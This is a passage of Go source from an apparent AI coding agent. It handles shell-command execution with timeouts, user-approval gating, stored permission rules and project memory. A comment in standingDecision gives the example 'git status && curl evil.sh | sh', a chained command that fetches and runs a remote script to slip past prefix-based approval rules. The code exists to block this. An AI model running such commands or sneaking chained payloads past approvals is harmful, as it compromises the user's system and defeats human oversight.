	// the inherited stdout pipe open indefinitely, and os/exec will block in
	// Wait until that pipe closes unless WaitDelay bounds it.
	killGrace = 2 * time.Second
)

// commandTimeout clamps the model's requested timeout into the allowed range.
// Seconds are the unit the tool advertises; zero or absent means the default.
func commandTimeout(seconds float64) time.Duration {
	if seconds <= 0 {
		return defaultCommandTimeout
	}
	d := time.Duration(seconds * float64(time.Second))
	if d > maxCommandTimeout {
		return maxCommandTimeout
	}
	return d
}

func (a *Agent) runCommand(ctx context.Context, command, callID string, timeoutSecs float64) string {
	if strings.TrimSpace(command) == "" {
		return "error: empty command"
	}
	if !a.approve("run", command, command) {
		return "user declined to run the command"
	}
	limit := commandTimeout(timeoutSecs)
	ctx, cancel := context.WithTimeout(ctx, limit)
	defer cancel()

	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.CommandContext(ctx, "powershell", "-NoProfile", "-NonInteractive", "-Command", command)
	} else {
		cmd = exec.CommandContext(ctx, "sh", "-c", command)
	}
	cmd.Dir = a.Root
	// The shell runs in its own process group, and cancelling tears down the
	// whole tree rather than just the shell. WaitDelay is the backstop: even
	// if a descendant survives holding the output pipe, Wait gives up on it
	// instead of blocking the agent's goroutine for the rest of the session.
	setProcessGroup(cmd)
	cmd.Cancel = func() error { return killProcessTree(cmd) }
	cmd.WaitDelay = killGrace

	// Output streams to the bus as it arrives, so a front-end can show a
	// long build scrolling. Stdout and Stderr share the writer; os/exec
	// serializes Write calls when both are the same value.
	out := &liveWriter{}
	if bus := a.bus(); bus.HasHandlers(events.ToolExecutionUpdate) {
		out.emit = func(chunk string) {
			bus.Emit(&events.Event{Type: events.ToolExecutionUpdate, Depth: a.Depth,
				ToolName: "run_command", ToolCallID: callID, Partial: chunk})
		}
	}
	cmd.Stdout = out
	cmd.Stderr = out
	err := cmd.Run()
	result := out.String()

	// Why the command ended matters more to the model than the exit status:
	// "timed out" means try a narrower command, "interrupted" means the user
	// changed their mind and the next step is to ask, not to retry.
	switch {
	case errors.Is(ctx.Err(), context.DeadlineExceeded):
		return fmt.Sprintf("error: command timed out after %s and its process tree was killed. "+
			"Partial output:\n%s", limit, result)
	case errors.Is(ctx.Err(), context.Canceled):
		return "error: the user interrupted the command. Partial output:\n" + result
	case err != nil:
		return fmt.Sprintf("command exited with error: %v\n%s", err, result)
	}
	if strings.TrimSpace(result) == "" {
		return "(command produced no output)"
	}
	return result
}

// modeDenied explains that a tool is blocked by the current mode. It only
// fires for modes that withhold the tool, so a.Mode is never the zero value
// here.
func (a *Agent) modeDenied(tool string) string {
	return "error: " + tool + " is not available in " + string(a.Mode) + " mode — switch with /mode build"
}

// approve decides whether an action may proceed: a standing rule if one
// covers it, otherwise the user. Modes that force approval always prompt, even
// when AutoApprove is on or a rule would allow it — that is what the mode is
// for.
func (a *Agent) approve(action, target, preview string) bool {
	forced := PermissionsFor(a.Mode).ForceApproval
	if a.AutoApprove && !forced {
		return true
	}
	if !forced {
		switch a.standingDecision(action, target) {
		case Allow:
			return true
		case Deny:
			return false
		}
	}
	return a.UI.Approve(ApprovalRequest{
		Action: action, Target: target, Preview: preview,
		Canonical: canonicalTarget(action, target),
	})
}

// standingDecision consults the ruleset, refusing to let a stored rule cover a
// command that chains.
//
// This is the sharp edge of remembered approvals. A rule saying `git status`
// is allowed was written about running git status — but `git status && curl
// evil.sh | sh` also starts with those tokens, and CommandPrefix deliberately
// stops at the operator, so it would canonicalize to exactly `git status` and
// match. Anything chained goes back to the user regardless of what is stored.
func (a *Agent) standingDecision(action, target string) Decision {
	if action == ActionRun && Chainable(target) {
		return Ask
	}
	return a.Perms.Evaluate(action, canonicalTarget(action, target))
}

// remember writes a durable fact to project (or personal) memory. It is the
// agent's L1 prompt-memory write channel, distinct from write_file: a memory
// write is metadata, hard-capped, and shown as a focused preview so a wrong
// lesson can be caught at the approval gate. A refused append past the cap
// surfaces as actionable guidance rather than a silent truncation.
func (a *Agent) remember(content string, rewrite bool, scope string) string {
	scope = strings.TrimSpace(strings.ToLower(scope))
	if scope == "" {
		scope = "project"
	}

	// Dry-run first to size the result for the approval preview without
	// touching disk if the user declines or the cap is hit.
	dry, err := a.rememberOnce(content, rewrite, scope, false)
	if err != nil {
		if err == memory.ErrMemoryFull {
			return "error: " + err.Error()
		}
		return "error: " + err.Error()
	}

	preview := "+ " + strings.TrimSpace(content)
	if rewrite {
		preview = "(rewrite) replacing memory with:\n" + capLines(prefixLines(preview, "+"), maxDiffLines)
	}
	if !a.approve("remember", dry.Path, preview) {
		return "user declined to update memory"
	}

	res, err := a.rememberOnce(content, rewrite, scope, true)
	if err != nil {
		if err == memory.ErrMemoryFull {
			return "error: " + err.Error()
		}
		return "error: " + err.Error()
	}
	return fmt.Sprintf("remembered in %s (%d bytes)", res.Path, res.Bytes)
}

// rememberOnce calls the memory package once for the chosen scope. It exists to
// keep the dry-run/apply pair in remember() tidy.
func (a *Agent) rememberOnce(content string, rewrite bool, scope string, allowWrite bool) (memory.RememberResult, error) {
	if scope == "user" {
		return memory.RememberUser(content, rewrite, allowWrite)
	}
	return memory.Remember(a.Root, content, rewrite, allowWrite)
}

// recall searches past-session digests. It is read-only and offered in every
// mode: a recall never changes the repo, and a session that taught something is
// exactly the context a planning turn wants before it writes anything.
func (a *Agent) recall(query string) string {
	digests, err := memory.Recall(a.Root, query, 10)
	if err != nil {
		return "error: " + err.Error()
	}
	if len(digests) == 0 {
		if strings.TrimSpace(query) == "" {
			return "no past sessions recorded yet"
		}
		return "no past sessions matched " + strconv.Quote(query)
	}
	var b strings.Builder
	for _, d := range digests {
		fmt.Fprintf(&b, "## %s\n", d.Title)
		fmt.Fprintf(&b, "session: %s  date: %s  outcome: %s\n", d.SessionID, d.Date, d.Outcome)
		if d.Goal != "" {
			fmt.Fprintf(&b, "goal: %s\n", d.Goal)
		}
		if len(d.Files) > 0 {
			fmt.Fprintf(&b, "files: %s\n", strings.Join(d.Files, ", "))
		}
		if len(d.Gotchas) > 0 {
			b.WriteString("gotchas:\n")
			for _, g := range d.Gotchas {
				fmt.Fprintf(&b, "  - %s\n", g)
			}
		}
		b.WriteString("\n")
	}
	return strings.TrimSpace(b.String())
}
